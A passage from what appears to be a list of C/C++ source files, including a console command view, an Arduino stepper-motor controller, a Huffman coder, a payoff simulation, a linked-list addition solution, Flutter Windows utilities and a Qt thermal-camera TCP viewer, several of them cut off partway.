// namespace hexl\n}  // namespace intel\n",
    "/*************************************************************************\n\u3010\u6587\u4ef6\u540d\u3011 ConsoleViewBase.cpp\n\u3010\u529f\u80fd\u6a21\u5757\u548c\u76ee\u7684\u3011 \u4e3a ConsoleViewBase.hpp \u63d0\u4f9b\u5b9e\u73b0\u3002\n\u3010\u5f00\u53d1\u8005\u53ca\u65e5\u671f\u3011 \u8d75\u4e00\u5f64 2024/7/24\n*************************************************************************/\n\n#include <cmath>\n#include <functional>\n#include <iostream>\n#include <map>\n#include <memory>\n#include <sstream>\n#include <string>\n#include \"../ViewBase.hpp\"\n#include \"../../Controllers/ControllerBase.hpp\"\n#include \"ConsoleViewBase.hpp\"\nusing namespace std;\nusing namespace C3w::Controllers;\n\nnamespace C3w {\n\nnamespace Views {\n\nnamespace Cli {\n\n/**********************************************************************\n\u3010\u51fd\u6570\u540d\u79f0\u3011 Display\n\u3010\u51fd\u6570\u529f\u80fd\u3011 \u5411\u7528\u6237\u5c55\u793a\u6b64\u89c6\u56fe\u3002\n\u3010\u53c2\u6570\u3011 \u65e0\n\u3010\u8fd4\u56de\u503c\u3011 \u65e0\n\u3010\u5f00\u53d1\u8005\u53ca\u65e5\u671f\u3011 \u8d75\u4e00\u5f64 2024/7/24\n**********************************************************************/\nvoid ConsoleViewBase::Display() {\n    Output << Palette::FG_GRAY << \"Type ? for help.\" << Palette::CLEAR << endl;\n    while (true) {\n        string line = Ask(m_Prompt, true);\n        if (line.empty()) {\n            continue;\n        }\n        else if (line == \"?\") {\n            ShowHelp();\n        }\n        else if (line == \"quit\") {\n            break;\n        }\n        else {\n            bool found = false;\n            for (auto& Pair: m_Commands) {\n                if (Pair.first == line) {\n                    auto result = Pair.second.Handler();\n                    if (result != Result::OK) {\n                        Output << Palette::FG_RED;\n                        Output << \"error: \" << ResultToString(result); \n                        Output << Palette::CLEAR << endl;\n                    }\n                    found = true;\n                    break;\n                }\n            }\n            if (!found) {\n                Output << Palette::FG_RED;\n                Output << \"error: Unrecognized command '\" << line << \"'.\"; \n                Output << Palette::CLEAR << endl;\n                for (auto& Pair: m_Commands) {\n                    if (Likelihood(line, Pair.first) >= 0.75f) {\n                        Output << Palette::FG_GRAY;\n                        Output << \"Perhaps you mean '\" << Pair.first;\n                        Output << \"'?\" << Palette::CLEAR << endl;\n                        break;\n                    }\n                }\n            }\n        }\n    }\n}\n\n/**********************************************************************\n\u3010\u51fd\u6570\u540d\u79f0\u3011 \u6784\u9020\u51fd\u6570\n\u3010\u51fd\u6570\u529f\u80fd\u3011 \u4f7f\u7528\u63a7\u5236\u5668\u4e0e\u6807\u51c6\u8f93\u5165/\u8f93\u51fa\u6d41\u521d\u59cb\u5316 ConsoleViewBase \u7c7b\u578b\u5b9e\u4f8b\u3002\n\u3010\u53c2\u6570\u3011\n    Controller: \u63a7\u5236\u5668\u6307\u9488\u3002\n\u3010\u8fd4\u56de\u503c\u3011 \u65e0\n\u3010\u5f00\u53d1\u8005\u53ca\u65e5\u671f\u3011 \u8d75\u4e00\u5f64 2024/7/24\n**********************************************************************/\nConsoleViewBase::ConsoleViewBase(shared_ptr<ControllerBase> Controller)\n    : ConsoleViewBase(Controller, cin, cout) {}\n\n/**********************************************************************\n\u3010\u51fd\u6570\u540d\u79f0\u3011 \u6784\u9020\u51fd\u6570\n\u3010\u51fd\u6570\u529f\u80fd\u3011 \u4f7f\u7528\u63a7\u5236\u5668\u4e0e\u6307\u5b9a\u8f93\u5165/\u8f93\u51fa\u6d41\u521d\u59cb\u5316 ConsoleViewBase \u7c7b\u578b\u5b9e\u4f8b\u3002\n\u3010\u53c2\u6570\u3011\n    Controller: \u63a7\u5236\u5668\u6307\u9488\u3002\n    Input: \u8f93\u5165\u6d41\u3002\n    Output: \u8f93\u51fa\u6d41\u3002\n\u3010\u8fd4\u56de\u503c\u3011 \u65e0\n\u3010\u5f00\u53d1\u8005\u53ca\u65e5\u671f\u3011 \u8d75\u4e00\u5f64 2024/7/24\n**********************************************************************/\nConsoleViewBase::ConsoleViewBase(\n    shared_ptr<ControllerBase> Controller, \n    istream& Input, \n    ostream& Output\n): ViewBase(Controller), Input(Input), Output(Output) {}\n\n/**********************************************************************\n\u3010\u51fd\u6570\u540d\u79f0\u3011 Ask\n\u3010\u51fd\u6570\u529f\u80fd\u3011 \u5411\u63a7\u5236\u53f0\u8f93\u51fa\u63d0\u793a\u7b26\u5e76\u8bfb\u5165\u4e00\u884c\u3002\n\u3010\u53c2\u6570\u3011\n    Prompt: \u8be2\u95ee\u7684\u63d0\u793a\u3002\n    Trim: \u662f\u5426\u53bb\u9664\u591a\u4f59\u7684\u7a7a\u767d\u5b57\u7b26\u3002\n\u3010\u8fd4\u56de\u503c\u3011\n    \u4ece\u8f93\u5165\u6d41\u8bfb\u5165\u7684\u4e00\u884c\u3002\n\u3010\u5f00\u53d1\u8005\u53ca\u65e5\u671f\u3011 \u8d75\u4e00\u5f64 2024/7/24\n**********************************************************************/\nstring ConsoleViewBase::Ask(string Prompt, bool Trim) const {\n    Output << Palette::FG_BLUE << Prompt << Palette::CLEAR;\n    string Answer;\n    getline(Input, Answer);\n    if (Trim) {\n        size_t Start = Answer.find_first_not_of(\" \\t\\n\\r\");\n        size_t End = Answer.find_last_not_of(\" \\t\\n\\r\");\n        if (Start == std::string::npos || End == std::string::npos) {\n            return \"\";\n        }\n        return Answer.substr(Start, End - Start + 1);\n    }\n    return Answer;\n}\n\n/**********************************************************************\n\u3010\u51fd\u6570\u540d\u79f0\u3011 Select\n\u3010\u51fd\u6570\u529f\u80fd\u3011 \u8ba9\u7528\u6237\u5728\u9009\u9879\u4e2d\u505a\u51fa\u9009\u62e9\u3002\n\u3010\u53c2\u6570\u3011\n    Prompt: \u8be2\u95ee\u7684\u63d0\u793a\u3002\n    Choices: \u9009\u9879\u7ec4\u6210\u7684\u5411\u91cf\u3002\n\u3010\u8fd4\u56de\u503c\u3011\n    \u7528\u6237\u9009\u62e9\u7684\u9879\uff0c\u4ece 1 \u5f00\u59cb\u3002\u5982\u679c\u8f93\u5165\u4e0d\u662f\u6570\u5b57\u8fd4\u56de 0\u3002\n\u3010\u5f00\u53d1\u8005\u53ca\u65e5\u671f\u3011 \u8d75\u4e00\u5f64 2024/7/24\n**********************************************************************/\nsize_t ConsoleViewBase::Select(\n    string Prompt, \n    const vector<string>& Choices\n) const {\n    Output << Palette::FG_BLUE << Prompt << Palette::CLEAR << endl;\n    for (size_t i = 0; i < Choices.size(); i++) {\n        Output << i + 1 << \". \" << Choices[i] << endl;\n    }\n    Output << Palette::FG_BLUE;\n    if (Choices.size() == 1) {\n        Output << \"[1]: \";\n    }\n    else {\n        Output << \"[1~\" << Choices.size() << \"]: \";\n    }\n    Output << Palette::CLEAR;\n    istringstream Stream(Ask(\"\"));\n    size_t Id;\n    Stream >> Id;\n    return Stream.bad() ? 0 : Id;\n}\n\n/**********************************************************************\n\u3010\u51fd\u6570\u540d\u79f0\u3011 ResultToString\n\u3010\u51fd\u6570\u529f\u80fd\u3011 \u5c06\u63a7\u5236\u5668\u8fd4\u56de\u7684\u7ed3\u679c\u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u3002\n\u3010\u53c2\u6570\u3011\n    AResult: \u8981\u8f6c\u5316\u7684 ControllerBase::Result \u679a\u4e3e\u3002\n\u3010\u8fd4\u56de\u503c\u3011\n    \u7ed3\u679c\u7684\u5b57\u7b26\u4e32\u8868\u793a\u5f62\u5f0f\u3002\n\u3010\u5f00\u53d1\u8005\u53ca\u65e5\u671f\u3011 \u8d75\u4e00\u5f64 2024/7/24\n**********************",
    "#include <Arduino.h>\n#include <Stepper_controller/Stepper_controller.h>\n#include <AD9833.h>\n\ntypedef enum{\n  Await_CMD,\n  Execute_Move_up,\n  Execute_Move_down,\n  Execute_Move_Left,\n  Execute_Move_Right,\n  Execute_Move_Origin,\n  Execute_Set_Origin,\n  Execute_Cal_Origin,\n  Execute_maxX\n}Control_FSM;\n\n\nvoid readCMD();\nvoid readTermination();\nvoid Probe_Tune_Test();\n\nControl_FSM cnt_fsm = Await_CMD;\n\nvoid setup() {\n  init_GPIO();\n\n  // for (uint16_t i = 0; i < 500; i++)\n  // {\n  //   // digitalWrite(Y_STEP_BIT, HIGH);\n  //   // digitalWrite(Z_STEP_BIT, HIGH);\n  //   // delay(2);\n  //   // digitalWrite(Y_STEP_BIT, LOW);\n  //   // digitalWrite(Z_STEP_BIT, LOW);\n  //   // delay(2);\n  //   PORTD ^= 0b11000000;\n  //   // delay(2);\n  //   delayMicroseconds(500);\n  //   PORTD ^= 0b11000000;\n  //   // delay(2);\n  //   delayMicroseconds(500);\n  // }\n  // delay(1000);\n\n  // digitalWrite(X_DIRECTION_BIT, HIGH);\n  // for (uint16_t i = 0; i < 600; i++)\n  // {\n  //   digitalWrite(X_STEP_BIT, HIGH);\n  //   // delay(2);\n  //   delayMicroseconds(500);\n  //   digitalWrite(X_STEP_BIT, LOW);\n  //   // delay(2);\n  //   delayMicroseconds(500);\n  // }\n  // delay(1000);\n\n  // digitalWrite(Y_DIRECTION_BIT, LOW);\n  // digitalWrite(Z_DIRECTION_BIT, HIGH);\n  // for (uint16_t i = 0; i < 500; i++)\n  // {\n  //   // digitalWrite(Y_STEP_BIT, HIGH);\n  //   // digitalWrite(Z_STEP_BIT, HIGH);\n  //   // delay(2);\n  //   // digitalWrite(Y_STEP_BIT, LOW);\n  //   // digitalWrite(Z_STEP_BIT, LOW);\n  //   // delay(2);\n  //   PORTD ^= 0b11000000;\n  //   // delay(2);\n  //   delayMicroseconds(500);\n  //   PORTD ^= 0b11000000;\n  //   // delay(2);\n  //   delayMicroseconds(500);\n  // }\n  // delay(1000);\n  // digitalWrite(X_DIRECTION_BIT, LOW);\n  // for (uint16_t i = 0; i < 600; i++)\n  // {\n  //   digitalWrite(X_STEP_BIT, HIGH);\n  //   // delay(2);\n  //   delayMicroseconds(500);\n  //   digitalWrite(X_STEP_BIT, LOW);\n  //   // delay(2);\n  //   delayMicroseconds(500);\n  // }\n  // move_step(500,0);\n  // delay(1000);\n  // move_step(0,500);\n  // delay(1000);\n  // move_step(-500,-500);\n  Serial.begin(115200);\n}\n\nvoid loop() {\n  uint16_t step_x = 0;\n  uint16_t step_y = 0;\n  // Probe_Tune_Test();\n  switch (cnt_fsm){\n  case Await_CMD :\n    readCMD();\n    break;\n  case Execute_Move_up :\n    digitalWrite(Y_DIRECTION_BIT, HIGH);\n    digitalWrite(Z_DIRECTION_BIT, LOW);\n    pulseY();\n    if(digitalRead(Limit_Y) == LOW)\n      for(uint8_t i = 0;i < 40;i++){\n        digitalWrite(Y_DIRECTION_BIT, LOW);\n        digitalWrite(Z_DIRECTION_BIT, HIGH);\n        pulseY();\n      }\n    cnt_fsm = Await_CMD;\n    break;\n  case Execute_Move_down :\n    digitalWrite(Y_DIRECTION_BIT, LOW);\n    digitalWrite(Z_DIRECTION_BIT, HIGH);\n    pulseY();\n    if(digitalRead(Limit_Y) == LOW)\n      for(uint8_t i = 0;i < 40;i++){\n        digitalWrite(Y_DIRECTION_BIT, HIGH);\n        digitalWrite(Z_DIRECTION_BIT, LOW);\n        pulseY();\n      }\n    cnt_fsm = Await_CMD;\n    break;\n  case Execute_Move_Left :\n    digitalWrite(X_DIRECTION_BIT, LOW);\n    pulseX();\n    if(digitalRead(Limit_X) == LOW)\n      for(uint8_t i = 0;i < 40;i++){\n        digitalWrite(X_DIRECTION_BIT, HIGH);\n        pulseX();\n      }\n    cnt_fsm = Await_CMD;\n    break;\n  case Execute_Move_Right :\n    digitalWrite(X_DIRECTION_BIT, HIGH);\n    pulseX();\n    if(digitalRead(Limit_X) == LOW)\n      for(uint8_t i = 0;i < 40;i++){\n        digitalWrite(X_DIRECTION_BIT, LOW);\n        pulseX();\n      }\n    cnt_fsm = Await_CMD;\n    break;\n  case Execute_Move_Origin :\n    readTermination();\n    break;\n  case Execute_Set_Origin :\n    readTermination();\n    break;\n  case Execute_Cal_Origin :\n    readTermination();\n    break;\n  case Execute_maxX:\n  /* goto max +X*/\n    while (digitalRead(Limit_X) == HIGH) {\n      digitalWrite(X_DIRECTION_BIT, HIGH);\n      pulseX();\n    }\n    step_x = 0;\n    for(uint8_t i = 0;i < 40;i++){\n      digitalWrite(X_DIRECTION_BIT, LOW);\n      pulseX();\n    }\n  /* goto max -X*/\n    while(digitalRead(Limit_X) == HIGH){\n      digitalWrite(X_DIRECTION_BIT, LOW);\n      pulseX();\n      step_x++;\n    }\n    for(uint8_t i = 0;i < 40;i++){\n      digitalWrite(X_DIRECTION_BIT, HIGH);\n      pulseX();\n    }\n\n    /* goto max +Y */\n    while(digitalRead(Limit_Y) == HIGH){\n      digitalWrite(Y_DIRECTION_BIT, HIGH);\n      digitalWrite(Z_DIRECTION_BIT, LOW);\n      pulseY();\n    }\n    step_y = 0;\n    for(uint8_t i = 0;i < 80;i++){\n      digitalWrite(Y_DIRECTION_BIT, LOW);\n      digitalWrite(Z_DIRECTION_BIT, HIGH);\n      pulseY();\n    }\n\n    while (digitalRead(Limit_Y) == HIGH){\n      digitalWrite(Y_DIRECTION_BIT, LOW);\n      digitalWrite(Z_DIRECTION_BIT, HIGH);\n      pulseY();\n      step_y++;\n    }\n    for(uint8_t i = 0;i < 80;i++){\n      digitalWrite(Y_DIRECTION_BIT, HIGH);\n      digitalWrite(Z_DIRECTION_BIT, LOW);\n      pulseY();\n    }\n\n    for(uint16_t i = 0;i < step_x/2;i++){\n      digitalWrite(X_DIRECTION_BIT, HIGH);\n      pulseX();\n    }\n    for(uint16_t i = 0;i < step_y/2;i++){\n      digitalWrite(Y_DIRECTION_BIT, HIGH);\n      digitalWrite(Z_DIRECT",
    "#include \"Huffman.h\"\n#include <vector>\n#include <map> \n#include <iostream>\n#include <algorithm>\n\nusing namespace std; \n\n\nHuffman::Huffman(string s){\n    this->message = s;\n    this->frequency_map(this->message,this->freq_map);\n}\n\nvoid Huffman::buildTree(){\n\n    for(auto e  : this->freq_map){\n        Node* n = new Node(e.second,e.first);\n        this->hp->add(n);\n    }\n    while(this->hp->size()){\n        Node* pp = new Node(this->hp->get_min()->ch,this->hp->get_min()->val);\n        pp->left = this->hp->get_min()->left;\n        pp->right = this->hp->get_min()->right;\n        this->hp->remove_min(); // remove only after assignment is done\n\n        if(this->hp->size() ==0){\n            this->final_tree = pp; // root is found\n            break;\n        }\n        Node* q = this->hp->get_min();\n        Node* qq  = new Node(this->hp->get_min()->ch,this->hp->get_min()->val);\n        qq->left = this->hp->get_min()->left;\n        qq->right = this->hp->get_min()->right;\n        this->hp->remove_min();\n        Node *t = new Node('\\0',pp->val+qq->val);\n        t->left = pp;\n        t->right = qq;\n        hp->add(t);\n\n    }\n    this->traverse(this->final_tree,\"\");\n\n}\n\nvoid Huffman::traverse(Node* n,string code_=\"\"){\n    if(!n){\n        return;\n    }\n    if(n->ch != '\\0'){\n        // cout << n->ch << \"=> \" << code_ <<endl;\n        this->mapping[n->ch] = code_;\n        this->rev_mapping[code_] = n->ch;\n\n    }\n    this->traverse(n->left,code_+'0');\n    this->traverse(n->right,code_+'1');    \n}\n\nstring Huffman::encode(){\n    string final_ = \"\";\n    for(auto e : message){\n        final_ += this->mapping[e];\n    }\n    return final_;\n}\n\nmap<char,string> Huffman::getMapping(){\n\treturn this->mapping;\n}\n\nstring Huffman::decode(string encoded_msg){\n    string buffer = \"\";\n    string final_ = \"\";\n    for(auto e : encoded_msg){\n        buffer +=e;\n        if(this->rev_mapping.find(buffer) != this->rev_mapping.end()){\n            final_ += this->rev_mapping[buffer];\n            buffer = \"\";\n        }\n    }\n    final_ += this->rev_mapping[buffer];\n    return final_;\n}\n\nvoid Huffman::frequency_map(string words,vector<pair<int,char>>& freq_map){\n\tsort(words.begin(),words.end());\n\tchar last_='\\0';\n\tint last_count = 0;\n\tfor(auto e : words){\n\t\tif(e == last_){\n\t\t\tlast_count++;\n\t\t}\n\t\telse{\n\t\t\tif(last_  == '\\0'){\n\t\t\t\tlast_ = e;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tpair<int,char> p = {++last_count,last_};\n\t\t\tfreq_map.push_back(p);\n\t\t\tlast_count = 0;\n\t\t\tlast_ = e;\n\t\t}\n\t}\n\tif(last_ != '\\0'){\n\t\tpair<int,char> p = {++last_count,last_};\n\t\tfreq_map.push_back(p);\n\t}\n\t\n\treturn;\n}",
    "#include \"Agents.h\"\n#include <random>\n#include \"Payoffs.h\"\n\nPayoffData::PayoffData(const Params& params)\n    : choices(params.n, params.t),\n      payoffs(params.n, params.t) {}\n\nvoid PayoffData::saveToCSV(int argc, char* argv[]) {\n    std::ostringstream oss;\n    for (int i = 1; i < argc; ++i) {\n        oss << argv[i];\n        if (i < argc - 1) {\n            oss << \"_\";\n        }\n    }\n    std::string base_filename = oss.str();\n    std::string payoffs_filename = \"../data/payoffs_\" + base_filename + \".csv\";\n    payoffs.save(payoffs_filename, arma::csv_ascii);\n}\n\narma::ivec chooseActions(int time_step, PayoffData& data, const Params& params) {\n   \n    if (time_step == 0) {\n        arma::ivec choices(params.n);\n        std::uniform_int_distribution<> dist(0, params.num_nodes - 1);\n        std::random_device rd;\n        std::mt19937 gen(rd());\n        for (int i = 0; i < params.n; ++i) {\n            choices[i] = dist(gen);\n        }\n        return choices;\n    } else {\n        arma::mat weighted_payoffs = data.payoffs.cols(0, time_step - 1);\n        arma::rowvec time_factors = arma::regspace<arma::rowvec>(time_step, -1, time_step - weighted_payoffs.n_cols + 1);\n        weighted_payoffs.each_row() /= time_factors;\n\n        arma::mat summed_payoffs = arma::zeros<arma::mat>(params.n, params.num_nodes);\n        for (arma::uword j = 0; j < weighted_payoffs.n_cols; ++j) {\n            for (arma::uword i = 0; i < params.n; ++i) {\n                int node_id = data.choices(i, j);\n                summed_payoffs(i, node_id) += weighted_payoffs(i, j);\n            }\n        }\n\n        for (arma::uword i = 0; i < params.n; ++i) {\n            double row_sum = arma::sum(summed_payoffs.row(i));\n            summed_payoffs.row(i) /= row_sum;\n        }\n\n        //odds are determined partially by historical data and partially by a uniform distribution\n        double uniform_prob = 1.0 / params.num_nodes;\n        for (arma::uword i = 0; i < summed_payoffs.n_rows; ++i) {\n            for (arma::uword j = 0; j < summed_payoffs.n_cols; ++j) {\n                summed_payoffs(i, j) = params.experience_bias * summed_payoffs(i, j) + (1 - params.experience_bias) * uniform_prob;\n            }\n        }\n\n        arma::ivec choices(params.n);\n        std::uniform_real_distribution<> dist(0.0, 1.0);\n        std::random_device rd;\n        std::mt19937 gen(rd());\n\n        for (arma::uword i = 0; i < params.n; ++i) {\n            double rand_val = dist(gen);\n            double cumulative_prob = 0.0;\n            for (arma::uword j = 0; j < summed_payoffs.n_cols; ++j) {\n                cumulative_prob += summed_payoffs(i, j);\n                if (rand_val <= cumulative_prob) {\n                    choices[i] = j;\n                    break;\n                }\n            }\n        }\n        return choices;\n    }\n}\n\nvoid updatePayoffs(int time_step, const arma::ivec& choices, const Agents& agents, PayoffData& payoffData) {\n    arma::uvec indices = arma::regspace<arma::uvec>(0, choices.n_elem - 1) * agents.competences.n_cols + arma::conv_to<arma::uvec>::from(choices);\n    arma::vec competence_values = agents.competences.elem(indices);\n    payoffData.choices.col(time_step) = choices;\n    payoffData.payoffs.col(time_step) = competence_values % arma::conv_to<arma::vec>::from(choices);\n}",
    "\n//ListNode definition\nstruct ListNode {\n    int val;\n    ListNode *next;\n    ListNode() : val(0), next(nullptr) {}\n    ListNode(int x) : val(x), next(nullptr) {}\n    ListNode(int x, ListNode *next) : val(x), next(next) {}\n};\n\nclass Solution {\n\n    public:\n        ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) {\n            int carry = 0, sum;\n            ListNode *newHead = nullptr,  *last = nullptr;\n            while(l1 || l2) {\n                sum = carry;\n                if(l1){\n                    sum += l1->val;\n                    l1 = l1->next;\n                }\n                if(l2){\n                    sum += l2->val;\n                    l2 = l2->next;\n                }\n                //Set the carry for next iteration if any\n                carry = sum/10;\n                //Get the numerber of units in the sum\n                sum %= 10;\n                ListNode* aux = new ListNode(sum);\n                if(!newHead) {\n                    newHead = aux;\n                    newHead->next = last;\n                } else {\n                    last->next = aux; \n                }\n                last = aux;\n            }\n            //Create a node for the carry \n            if(carry > 0) {\n                last->next = new ListNode(carry);\n                last = last->next; \n            }\n            return newHead;\n        }\n\n};\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"widget.h\"\n#include \"ui_widget.h\"\n\nWidget::Widget(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::Widget)\n{\n    ui->setupUi(this);\n    //\u521b\u5efa\u4e00\u4e2aQTcpServer\u5bf9\u8c61\uff0c\u7528\u4e8e\u76d1\u542cTCP\u8fde\u63a5\n    server = new QTcpServer(this);\n    // QPixmap pixmap=QPixmap(\"D:/MLX90640/008 Rainy Ashville.png\").scaled(this->size());\n    // QPalette palette;\n    // //\u8bbe\u7f6e\u4e3b\u7a97\u53e3\u80cc\u666f\u56fe\u7247\n    // palette.setBrush(QPalette::Window,QBrush(pixmap));\n\n    // \u521b\u5efa\u6a21\u578b\uff0c\u7528\u4e8e\u5b58\u50a824x32\u7684\u6570\u636e\n    model = new QStandardItemModel(24, 32, this);  // 24\u884c32\u5217\n    //\u5c06\u6a21\u578b\u7ed1\u5b9a\u5230tableView\u63a7\u4ef6\n    ui->tableView->setModel(model);\n    for (int i = 0; i < 32; ++i) {\n        ui->tableView->setColumnWidth(i, 40);\n    }\n    //\u5982\u4e0b\u4ee3\u7801\u8bbe\u7f6e\u6a2a\u5411\u8868\u683c\u5934\u7684\u95f4\u9694\u7ebf\uff0c\u6709\u56db\u4e2a\u65b9\u5411\u7684\u95f4\u9694\u7ebf,\u4e0d\u9700\u8981\u95f4\u9694\u7ebf\u7684\u53ef\u4ee5\u8bbe\u7f6e\u4e3a0px\n    ui->tableWidget->horizontalHeader()->setStyleSheet(\n                                            \"QHeaderView::section{\"\n                                            \"border-top:0px solid #E5E5E5;\"\n                                            \"border-left:0px solid #E5E5E5;\"\n                                            \"border-right:0.5px solid #E5E5E5;\"\n                                            \"border-bottom: 0.5px solid #E5E5E5;\"\n                                            \"background-color:white;\"\n                                            \"padding:4px;\"\n                                            \"}\"\n        );\n\n        //\u5982\u4e0b\u4ee3\u7801\u8bbe\u7f6e\u6a2a\u5411\u8868\u683c\u5934\u7684\u95f4\u9694\u7ebf\uff0c\u6709\u56db\u4e2a\u65b9\u5411\u7684\u95f4\u9694\u7ebf,\u4e0d\u9700\u8981\u95f4\u9694\u7ebf\u7684\u53ef\u4ee5\u8bbe\u7f6e\u4e3a0px\n    ui->tableWidget->verticalHeader()->setStyleSheet(\n                \"QHeaderView::section{\"\n                \"border-top:0px solid #E5E5E5;\"\n                \"border-left:0px solid #E5E5E5;\"\n                \"border-right:0.5px solid #E5E5E5;\"\n                \"border-bottom: 0.5px solid #E5E5E5;\"\n                \"background-color:white;\"\n                \"padding:4px;\"\n                \"}\"\n        );\n\n        //\u5982\u4e0b\u4ee3\u7801\u8bbe\u7f6e\u5217\u8868\u5de6\u4e0a\u89d2\u7b2c0\u884c\u7b2c0\u5217\u7684\u90a3\u4e2a\u683c\u5b50\u7684\u8fb9\u6846\u7ebf\n    ui->tableWidget->verticalHeader()->setStyleSheet(\n                \"QTableCornerButton::section{\"\n                \"border-top:0px solid #E5E5E5;\"\n                \"border-left:0px solid #E5E5E5;\"\n                \"border-right:0.5px solid #E5E5E5;\"\n                \"border-bottom: 0.5px solid #E5E5E5;\"\n                \"background-color:white;\"\n                \"}\"\n        );\n    //\u8bbe\u7f6e\u663e\u793a\u5e73\u5747\u503c\u7684\u8868\u683cQtableWidget\n    ui->tableWidget->setRowCount(1);\n    ui->tableWidget->setColumnCount(1);\n    ui->tableWidget->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);\n    ui->tableWidget->setHorizontalHeaderLabels(QStringList() << \"\u6e29\u5ea6\u5e73\u5747\u503c\");\n\n    // \u521b\u5efaQImage\u5bf9\u8c61\uff0c\u7528\u4e8e\u663e\u793a\u56fe\u50cf\n    image = QImage(32*2, 24*2, QImage::Format_RGB888); // Ensure dimensions match\n\n    //\u521b\u5efa\u5e76\u8bbe\u7f6e\u4e00\u4e2aQGraphicsScene\u5bf9\u8c61\uff0c\u7528\u4e8e\u5728graphicsView\u4e2d\u663e\u793a\u56fe\u50cf\n    ui->graphicsView->setScene(new QGraphicsScene(this));\n    ui->graphicsView->scene()->addPixmap(QPixmap::fromImage(image));\n\n    // \u8fde\u63a5newConnection\u4fe1\u53f7\u5230\u69fd\u51fd\u6570\n    connect(server, &QTcpServer::newConnection, this, &Widget::newConnection);\n\n    comboBox = ui->comboBox;\n    comboBox->addItem(\"Pseudo Color 1\", GCM_Pseudo1);\n    comboBox->addItem(\"Pseudo Color 2\", GCM_Pseudo2);\n    comboBox->addItem(\"Metal 1\", GCM_Metal1);\n    comboBox->addItem(\"Metal 2\", GCM_Metal2);\n    comboBox->addItem(\"Rainbow 1\", GCM_Rainbow1);\n    comboBox->addItem(\"Rainbow 2\", GCM_Rainbow2);\n    comboBox->addItem(\"Rainbow 3\", GCM_Rainbow3);\n    comboBox->addItem(\"Zhou\", GCM_Zhou);\n    comboBox->addItem(\"Ning\", GCM_Ning);\n    comboBox->addItem(\"Gray\", GCM_Gray);\n    converMethod = static_cast<PseudoColorMethod>(comboBox->currentData().toInt());\n    connect(comboBox, QOverload<int>::of(&QComboBox::currentIndexChanged), this, [=](int index) {\n        converMethod = static_cast<PseudoColorMethod>(comboBox->itemData(index).toInt());\n    });\n\n}\n\nWidget::~Widget()\n{\n    delete ui;\n}\n\nvoid Widget::on_pushButton_clicked()\n{\n    // \u5f00\u59cb\u76d1\u542c\u8fde\u63a5\n    if (!server->listen(QHostAddress::Any, 8888)) {\n        qDebug() << \"\u670d\u52a1\u5668\u542f\u52a8\u5931\u8d25\uff01\";\n        return;\n    }\n    qDebug() << \"\u670d\u52a1\u5668\u542f\u52a8\u6210\u529f\uff0c\u7b49\u5f85\u8fde\u63a5...\";\n}\n\nvoid Widget::newConnection()\n{\n    // \u83b7\u53d6\u65b0\u8fde\u63a5\u7684socket\n    socket = server->nextPendingConnection();\n\n    // \u8fde\u63a5socket\u7684readyRead\u4fe1\u53f7\u5230readData\u69fd\u51fd\u6570\n    connect(socket, &QTcpSocket::readyRead, this, &Widget::readData);\n\n    qDebug() << \"\u5ba2\u6237\u7aef\u5df2\u8fde\u63a5\uff1a\" << socket->peerAddress().toString();\n}\n\nvoid Widget::readData()\n{\n    // \u68c0\u67e5\u662f\u5426\u6709\u8db3\u591f\u7684\u6570\u636e\n    if (socket->bytesAvailable() < sizeof(float) * 768) {\n        return;\n    }\n\n    // \u63a5\u6536768\u6570\u7ec4\u6570\u636e\n    float data[768];\n    socket->read(reinterpret_cast<char*>(data), sizeof(data));\n    // \u5904\u7406\u6570\u636e\n    conversion(data);\n    qDebug() << \"\u6570\u636e\u5df2\u63a5\u6536\u5e76\u5904\u7406\u3002\";\n}\n\nvoid Widget::conversion(float* data)\n{\n    float sum = 0.0;\n    for (int i = 0; i < 768; ++i) {\n        sum += data[i];\n    }\n    uint8_t grayData[24][32];\n    uint8_t upsampleGrayData[24*2][32*2];\n    float average = sum / 768;\n    // \u5728TableWidget\u4e2d\u663e\u793a\u5e73\u5747\u503c\n    QTableWidgetItem *item = new QTableWidgetItem(QString::number(average));\n    ui->tableWidget->setItem(0, 0, item);\n\n    // \u5c06\u4e00\u7ef4\u6570\u7ec4\u8f6c\u6362\u4e3a24x32\u7684\u4e8c\u7ef4\u7070\u5ea6\u6570\u7ec4\n    for (int i = 0; i < 24; ++i) {\n        for (int j = 0; j < 32; ++j) {\n            /* \u5bf9\u6d6e\u70b9\u6570\u8fdb\u884c\u5f52\u4e00\u5316\u540e\u62c9\u4f38\u5230255, 10C-40C */\n            float value_temp = (data[i * 32",
